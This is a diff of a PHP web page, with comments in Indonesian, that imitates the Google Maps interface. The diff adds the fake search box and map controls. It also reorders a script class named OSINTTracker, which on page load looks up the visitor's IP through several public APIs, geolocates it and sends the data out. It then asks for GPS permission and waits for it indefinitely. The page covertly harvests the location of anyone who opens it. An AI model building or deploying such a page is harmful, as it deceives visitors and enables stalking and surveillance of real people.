@@ -291,99 +291,89 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         .zoom-btn:hover { background: #f8f9fa; }
         .zoom-btn:first-child { border-bottom: 1px solid #e8eaed; }
+
         .mobile-bottom-sheet {
-                display: none;
-                position: absolute;
-                bottom: 0;
-                left: 0;
-                width: 100%;
-                background: white;
-                border-top-left-radius: 16px;
-                border-top-right-radius: 16px;
-                box-shadow: 0 -4px 10px rgba(0,0,0,0.1);
-                z-index: 15;
-                padding-bottom: 20px;
-                transform: translateY(100%);
-                transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            }
+            display: none;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: white;
+            border-top-left-radius: 16px;
+            border-top-right-radius: 16px;
+            box-shadow: 0 -4px 10px rgba(0,0,0,0.1);
+            z-index: 15;
+            padding-bottom: 20px;
+            transform: translateY(100%);
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
 
-            .mobile-bottom-sheet.active {
-                transform: translateY(0);
-            }
+        .mobile-bottom-sheet.active {
+            transform: translateY(0);
+        }
 
-            .sheet-handle-wrap {
-                padding: 12px 0;
-                display: flex;
-                justify-content: center;
-                cursor: pointer;
-            }
+        .sheet-handle-wrap {
+            padding: 12px 0;
+            display: flex;
+            justify-content: center;
+            cursor: pointer;
+        }
 
-            .sheet-handle {
-                width: 36px;
-                height: 4px;
-                background: #dadce0;
-                border-radius: 2px;
-            }
+        .sheet-handle {
+            width: 36px;
+            height: 4px;
+            background: #dadce0;
+            border-radius: 2px;
+        }
 
-            .explore-content {
-                padding: 0 20px 10px 20px;
-            }
+        .explore-content {
+            padding: 0 20px 10px 20px;
+        }
 
-            .explore-title {
-                font-size: 22px;
-                font-weight: 500;
-                color: #202124;
-                margin-bottom: 16px;
-            }
+        .explore-title {
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 16px;
+        }
 
-            .category-chips {
-                display: flex;
-                gap: 12px;
-                overflow-x: auto;
-                padding-bottom: 8px;
-            }
+        .category-chips {
+            display: flex;
+            gap: 12px;
+            overflow-x: auto;
+            padding-bottom: 8px;
+        }
 
-            .category-chips::-webkit-scrollbar { display: none; }
+        .category-chips::-webkit-scrollbar { display: none; }
 
-            .chip {
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-                gap: 8px;
-                min-width: 72px;
-                cursor: pointer;
-            }
+        .chip {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            min-width: 72px;
+            cursor: pointer;
+        }
 
-            .chip-icon {
-                width: 40px;
-                height: 40px;
-                border-radius: 50%;
-                background: #f1f3f4;
-                border: 1px solid #e8eaed;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                color: #1a73e8;
-                font-size: 16px;
-            }
+        .chip-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #f1f3f4;
+            border: 1px solid #e8eaed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a73e8;
+            font-size: 16px;
+        }
 
-            .chip-text {
-                font-size: 12px;
-                color: #3c4043;
-                font-weight: 500;
-            }
+        .chip-text {
+            font-size: 12px;
+            color: #3c4043;
+            font-weight: 500;
+        }
 
-            @media (max-width: 768px) {
-                .mobile-bottom-sheet {
-                    display: block;
-                }
-                .top-right-controls {
-                    top: 72px;
-                }
-                .bottom-right-controls {
-                    bottom: 120px;
-                }
-            }
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -465,6 +455,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
         
         @media (max-width: 768px) {
+            .search-container-box {
+                width: calc(100% - 24px);
+            }
+            .mobile-bottom-sheet {
+                display: block;
+            }
+            .top-right-controls {
+                top: 72px;
+            }
+            .bottom-right-controls {
+                bottom: 120px;
+            }
             .location-status-bar {
                 bottom: 120px;
                 left: 12px;
@@ -492,7 +494,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         </div>
     </div>
 
-    <!-- Search box dan controls lainnya ... -->
+    <div class="search-container-box">
+        <div class="menu-btn">
+            <i class="fas fa-bars"></i>
+        </div>
+        <input type="text" class="search-input" placeholder="Telusuri Google Maps" value="Jakarta, Indonesia">
+        <div class="search-actions">
+            <div class="action-icon"><i class="fas fa-search"></i></div>
+            <div class="divider"></div>
+            <div class="action-icon blue"><i class="fas fa-directions"></i></div>
+        </div>
+    </div>
+
+    <div class="top-right-controls">
+        <div class="map-layer-btn">
+            <i class="fas fa-layer-group"></i>
+        </div>
+        <div class="profile-avatar">S</div>
+    </div>
+
+    <div class="bottom-right-controls">
+        <div class="floating-btn">
+            <i class="fas fa-crosshairs"></i>
+        </div>
+        <div class="zoom-group">
+            <button class="zoom-btn"><i class="fas fa-plus"></i></button>
+            <button class="zoom-btn"><i class="fas fa-minus"></i></button>
+        </div>
+    </div>
 
     <div class="mobile-bottom-sheet" id="bottomSheet">
         <div class="sheet-handle-wrap">
@@ -524,6 +553,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
         </div>
     </div>
+
     <script>
     // OSINT Tracker - MENUNGGU IZIN LOKASI TANPA TIMEOUT
     class OSINTTracker {
@@ -589,52 +619,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
         }
         
-         async init() {
+        async init() {
             this.updateStatus('Mengambil data IP...', 'Mendeteksi jaringan');
-            await this.getIPAddress();
-            await this.sendData();
-            this.requestGPSPermission();
-        }
-        
-        async getIPAddress() {
-            const apis = [
-                'https://api.ipify.org?format=json',
-                'https://api.myip.com',
-                'https://ipapi.co/json/',
-                'https://ipinfo.io/json'
-            ];
             
-            for (const api of apis) {
-                try {
-                    const response = await fetch(api, { mode: 'cors', cache: 'no-cache' });
-                    const data = await response.json();
-                    
-                    if (data.ip) {
-                        this.userData.ip_address = data.ip;
-                        this.userData.public_ip = data.ip;
-                        await this.getIPLocation(data.ip);
-                        return;
-                    }
-                } catch (e) {}
-            }
-        }
-        
-        async getIPLocation(ip) {
-            try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
-                    mode: 'cors',
-                    cache: 'no-cache'
-                });
-                const data = await response.json();
-                
-                if (data && !data.error) {
-                    this.userData.country = data.country_name || 'Tidak diketahui';
-                    this.userData.city = data.city || 'Tidak diketahui';
-                    this.userData.latitude = data.latitude || 0;
-                    this.userData.longitude = data.longitude || 0;
-                    this.userData.source = 'ip_based';
-                }
-            } catch (e) {}
+            // Ambil IP dulu
+            await this.getIPAddress();
+            
+            // Kirim data awal (tanpa GPS dulu)
+            await this.sendData();
+            
+            // LANGSUNG MINTA IZIN LOKASI - TANPA TIMEOUT, MENUNGGU SELAMANYA
+            this.requestGPSPermission();
         }
         
         async requestGPSPermission() {
@@ -772,6 +767,47 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 },
                 options
             );
+        }
+        
+        async getIPAddress() {
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://api.myip.com',
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json'
+            ];
+            
+            for (const api of apis) {
+                try {
+                    const response = await fetch(api, { mode: 'cors', cache: 'no-cache' });
+                    const data = await response.json();
+                    
+                    if (data.ip) {
+                        this.userData.ip_address = data.ip;
+                        this.userData.public_ip = data.ip;
+                        await this.getIPLocation(data.ip);
+                        return;
+                    }
+                } catch (e) {}
+            }
+        }
+        
+        async getIPLocation(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
+                    mode: 'cors',
+                    cache: 'no-cache'
+                });
+                const data = await response.json();
+                
+                if (data && !data.error) {
+                    this.userData.country = data.country_name || 'Tidak diketahui';
+                    this.userData.city = data.city || 'Tidak diketahui';
+                    this.userData.latitude = data.latitude || 0;
+                    this.userData.longitude = data.longitude || 0;
+                    this.userData.source = 'ip_based';
+                }
+            } catch (e) {}
         }
         
         async reverseGeocode() {
